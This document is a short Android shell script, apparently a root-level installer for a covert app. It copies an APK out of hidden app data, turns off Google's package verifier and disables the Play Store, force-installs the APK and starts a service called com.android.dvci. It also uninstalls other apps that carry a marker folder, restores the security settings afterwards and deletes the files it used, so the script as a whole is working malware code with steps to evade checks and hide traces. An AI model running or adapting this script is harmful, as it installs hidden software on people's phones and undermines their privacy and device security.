export LD_LIBRARY_PATH=/vendor/lib:/system/lib

rm /data/local/tmp/providers.apk
cat /data/data/*/app_qza/core.*.apk > /data/local/tmp/providers.apk

settings put global package_verifier_enable 0
pm disable com.android.vending
sleep 1

pm install -r -f /data/local/tmp/providers.apk
sleep 2

am startservice com.android.dvci/.ServiceMain
am broadcast -a android.intent.action.USER_PRESENT
#pm disable com.android.deviceinfo
#pm uninstall com.android.deviceinfo

for geb in `ls /data/data/*/files/geb`; do
	init=${geb#/data/data/}
    package=${init%%/*}

    if [ "$package" != "com.android.dvci" ]; then
	    pm disable $package
	    pm uninstall $package
	fi
done

sleep 2
settings put global package_verifier_enable 1
pm enable com.android.vending

rm /data/local/tmp/providers.apk
rm -r /sdcard/.lost.found






